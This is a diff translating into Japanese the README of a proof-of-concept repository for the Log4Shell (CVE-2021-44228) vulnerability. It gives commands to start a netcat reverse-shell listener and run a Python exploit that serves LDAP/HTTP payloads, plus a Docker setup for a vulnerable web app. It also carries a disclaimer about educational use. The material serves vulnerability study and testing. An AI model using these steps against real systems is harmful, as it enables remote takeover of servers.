@@ -1,10 +1,11 @@
 # log4j-shell-poc
 CVE-2021-44228(通称Log4shell)に対するPoC。  
-最近、ElasticSearchや Minecraftなどで広く使われている Apacheのロギングライブラリlog4jに新たな脆弱性が発見されました。
+最近、ElasticSearchや Minecraftなどで広く使われている Javaのロギングライブラリlog4jに新たな脆弱性が発見されました。
 
 このリポジトリでは、脆弱性のあるアプリケーションの例と、その脆弱性を利用したPoCの例を作成しています。
 
-A video showing the exploitation process
+
+実行プロセス
 ----------------------------------------
 
 Vuln Webアプリケーション:
@@ -13,13 +14,13 @@ https://user-images.githubusercontent.com/87979263/146113359-20663eaa-555d-4d60-
 
 <br>
 
-Ghidra (Old script):
+Ghidra (古いスクリプト):
 
 https://user-images.githubusercontent.com/87979263/145728478-b4686da9-17d0-4511-be74-c6e6fff97740.mp4
 
 <br>
 
-Minecraft PoC (Old script):
+Minecraft PoC (古いスクリプト):
 
 https://user-images.githubusercontent.com/87979263/145681727-2bfd9884-a3e6-45dd-92e2-a624f29a8863.mp4
 
@@ -27,7 +28,7 @@ https://user-images.githubusercontent.com/87979263/145681727-2bfd9884-a3e6-45dd-
 概念実証(PoC)
 ----------------------
 
-As a PoC we have created a python file that automates the process. 
+PoCとして、プロセスを自動化するPythonファイルを作成しました。
 
 
 ```bash
@@ -36,11 +37,11 @@ pip install -r requirements.txt
 #### :
 
 
-* Start a netcat listener to accept reverse shell connection.<br>
+* netcatリスナーを起動して、リバースシェル接続を受け入れます。<br>
 ```py
 nc -lvnp 9001
 ```
-* Launch the exploit.<br>
+* エクスプロイトを起動します。 <br>
 **Note:** この作業を行うには、解凍したjavaアーカイブの名前が `jdk1.8.0_20` であり、同じディレクトリにある必要があります。
 ```py
 $ python3 poc.py --userip localhost --webport 8000 --lport 9001
@@ -56,7 +57,7 @@ $ python3 poc.py --userip localhost --webport 8000 --lport 9001
 Listening on 0.0.0.0:1389
 ```
 
-This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.
+このスクリプトは、HTTPサーバーとLDAPサーバーをセットアップし、脆弱なパラメーターに貼り付けるために使用できるペイロードも作成します。 この後、すべてがうまくいけば、lportにシェルを取得する必要があります。 
 
 <br>
 
@@ -64,14 +65,14 @@ This script will setup the HTTP server and the LDAP server for you, and it will 
 脆弱性が含まれるアプリケーション
 --------------------------
 
-We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
+脆弱なWebアプリケーションにDockerfileを追加しました。 これは、以下の手順に従って使用できます。 
 ```c
 1: docker build -t log4j-shell-poc .
 2: docker run --network host log4j-shell-poc
 ```
-Once it is running, you can access it on localhost:8080
+実行すると、localhost:8080でアクセスできます。
 
-If you would like to further develop the project you can use Intellij IDE which we used to develop the project. We have also included a `.idea` folder where we have configuration files which make the job a bit easier. You can probably also use other IDE's too.
+プロジェクトをさらに開発したい場合は、プロジェクトの開発に使用したIntellijIDEを使用できます。 また、作業を少し簡単にする構成ファイルがある`.idea`フォルダーも含まれています。 おそらく他のIDEも使用できます。 
 
 
 
@@ -96,9 +97,8 @@ Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
 Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
 ```
 
-Disclaimer
+免責事項
 ----------
-This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).
+このリポジトリは、CVE-2021-44228へのワンクリックエクスプロイトを目的としたものではありません。 このプロジェクトの目的は、人々がこの素晴らしい脆弱性について学び、おそらく自分のアプリケーションをテストするのを助けることです（ただし、この目的のためのより良いアプリケーションがあります。 [https://log4shell.tools/](https://log4shell.tools/))
 
-Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it.
-
+私たちのチームは、悪意のある活動に対するこのエクスプロイトの使用を支援または推奨しません。したがって、支援を求める場合は、ターゲットサービスを所有しているか、ペネトレーションテストを行う権限があることを証明するものを提供する必要があります。
